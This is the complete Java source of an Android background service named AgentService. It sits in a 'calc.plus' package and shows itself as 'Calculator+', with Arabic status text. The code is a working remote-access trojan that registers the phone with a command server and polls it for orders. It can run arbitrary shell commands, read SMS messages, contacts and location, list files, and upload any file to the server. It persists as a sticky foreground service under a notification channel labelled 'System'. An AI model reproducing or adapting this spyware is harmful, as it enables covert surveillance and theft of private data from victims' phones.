package com.calc.plus;

import android.app.*;
import android.content.*;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.Settings;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.UUID;

public class AgentService extends Service {
    private String server, agentId;
    private volatile boolean alive = true;
    private Thread loop;

    @Override public void onCreate() { super.onCreate(); startForeground(1, notif()); }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        SharedPreferences sp = getSharedPreferences("cfg", MODE_PRIVATE);
        if (intent != null && intent.getStringExtra("url") != null)
            sp.edit().putString("url", intent.getStringExtra("url")).apply();
        server = sp.getString("url", "");
        agentId = sp.getString("id", null);
        if (agentId == null) {
            agentId = UUID.randomUUID().toString().substring(0, 8);
            sp.edit().putString("id", agentId).apply();
        }
        if (loop == null && !server.isEmpty()) {
            loop = new Thread(this::runLoop);
            loop.start();
        }
        return START_STICKY;
    }

    private void runLoop() {
        register();
        while (alive) {
            try {
                JSONObject t = getJson(server + "/api/task/" + agentId);
                String cmd = t.optString("cmd", "");
                if (cmd != null && !cmd.isEmpty() && !"null".equals(cmd)) {
                    postResult(t.optString("id"), cmd, exec(cmd));
                } else Thread.sleep(3000);
            } catch (Exception e) {
                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
            }
        }
    }

    private void register() {
        try {
            JSONObject info = new JSONObject()
                .put("model", Build.MANUFACTURER + " " + Build.MODEL)
                .put("android", Build.VERSION.RELEASE)
                .put("sdk", Build.VERSION.SDK_INT)
                .put("id", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
            postJson(server + "/api/register", new JSONObject().put("id", agentId).put("info", info).toString());
        } catch (Exception ignored) {}
    }

    private String exec(String raw) {
        try {
            String[] p = raw.split("\\s+", 2);
            String c = p[0].toLowerCase();
            String arg = p.length > 1 ? p[1] : "";
            switch (c) {
                case "info":     return deviceInfo();
                case "shell":    return shell(arg);
                case "ls":       return listDir(arg.isEmpty() ? "/sdcard" : arg);
                case "sms":      return readSms();
                case "contacts": return readContacts();
                case "loc":      return location();
                case "pull":     return pull(arg);
                default:         return "أوامر: info | shell | ls | sms | contacts | loc | pull";
            }
        } catch (Exception e) { return "خطأ: " + e; }
    }

    private String shell(String cmd) throws Exception {
        if (cmd.isEmpty()) return "usage: shell <cmd>";
        ProcessBuilder pb = new ProcessBuilder("sh", "-c", cmd);
        pb.redirectErrorStream(true);
        Process proc = pb.start();
        BufferedReader r = new BufferedReader(new InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8));
        StringBuilder sb = new StringBuilder(); String l;
        while ((l = r.readLine()) != null) sb.append(l).append('\n');
        proc.waitFor();
        return sb.toString();
    }

    private String listDir(String path) {
        File d = new File(path);
        File[] files = d.listFiles();
        if (files == null) return "لا يمكن قراءة " + path;
        StringBuilder sb = new StringBuilder(path).append(":\n");
        for (File f : files)
            sb.append(f.isDirectory() ? "d " : "- ").append(f.length()).append("\t").append(f.getName()).append('\n');
        return sb.toString();
    }

    private String readSms() {
        StringBuilder sb = new StringBuilder();
        Cursor c = getContentResolver().query(android.net.Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 60");
        if (c == null) return "لا صلاحية SMS";
        while (c.moveToNext())
            sb.append(c.getString(c.getColumnIndexOrThrow("address"))).append(" | ")
              .append(c.getString(c.getColumnIndexOrThrow("body"))).append('\n');
        c.close();
        return sb.toString();
    }

    private String readContacts() {
        StringBuilder sb = new StringBuilder();
        Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
        if (c == null) return "لا صلاحية جهات الاتصال";
        while (c.moveToNext())
            sb.append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
              .append(" | ")
              .append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)))
              .append('\n');
        c.close();
        return sb.toString();
    }

    private String location() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location best = null;
            for (String prov : new String[]{LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER}) {
                Location l = lm.getLastKnownLocation(prov);
                if (l != null && (best == null || l.getTime() > best.getTime())) best = l;
            }
            if (best == null) return "لا موقع متاح";
            return best.getLatitude() + "," + best.getLongitude() + "  ±" + best.getAccuracy() + "m";
        } catch (SecurityException e) { return "لا صلاحية الموقع"; }
    }

    private String pull(String path) throws Exception {
        File f = new File(path);
        if (!f.exists()) return "غير موجود: " + path;
        HttpURLConnection c = (HttpURLConnection) new URL(server + "/api/upload/" + agentId).openConnection();
        c.setRequestMethod("POST"); c.setDoOutput(true);
        String b = "----x" + System.currentTimeMillis();
        c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + b);
        OutputStream os = c.getOutputStream();
        os.write(("--" + b + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\""
                 + f.getName() + "\"\r\nContent-Type: application/octet-stream\r\n\r\n").getBytes(StandardCharsets.UTF_8));
        FileInputStream in = new FileInputStream(f);
        byte[] buf = new byte[8192]; int n;
        while ((n = in.read(buf)) > 0) os.write(buf, 0, n);
        in.close();
        os.write(("\r\n--" + b + "--\r\n").getBytes(StandardCharsets.UTF_8));
        os.close();
        return "رفع " + f.getName() + " → HTTP " + c.getResponseCode();
    }

    private String deviceInfo() {
        return "model: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
               "android: " + Build.VERSION.RELEASE + "\n" +
               "sdk: " + Build.VERSION.SDK_INT + "\n" +
               "id: " + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "\n" +
               "sdcard: " + Environment.getExternalStorageDirectory() + "\n";
    }

    private void postResult(String id, String cmd, String out) {
        try {
            postJson(server + "/api/result", new JSONObject()
                .put("id", agentId).put("cmd", cmd).put("out", out == null ? "" : out).toString());
        } catch (Exception ignored) {}
    }

    private String postJson(String url, String body) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setRequestMethod("POST"); c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "application/json; charset=utf-8");
        c.setConnectTimeout(15000); c.setReadTimeout(30000);
        OutputStream os = c.getOutputStream();
        os.write(body.getBytes(StandardCharsets.UTF_8));
        os.close();
        return read(c);
    }

    private JSONObject getJson(String url) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setConnectTimeout(15000); c.setReadTimeout(30000);
        return new JSONObject(read(c));
    }

    private String read(HttpURLConnection c) throws Exception {
        InputStream is = c.getResponseCode() < 400 ? c.getInputStream() : c.getErrorStream();
        BufferedReader r = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8));
        StringBuilder sb = new StringBuilder(); String l;
        while ((l = r.readLine()) != null) sb.append(l);
        r.close();
        return sb.toString();
    }

    private Notification notif() {
        String ch = "sys";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = getSystemService(NotificationManager.class);
            nm.createNotificationChannel(new NotificationChannel(ch, "System", NotificationManager.IMPORTANCE_MIN));
        }
        Notification.Builder b = Build.VERSION.SDK_INT >= 26
            ? new Notification.Builder(this, ch) : new Notification.Builder(this);
        return b.setContentTitle("Calculator+").setContentText("قيد التشغيل")
                .setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build();
    }

    @Override public IBinder onBind(Intent i) { return null; }
}
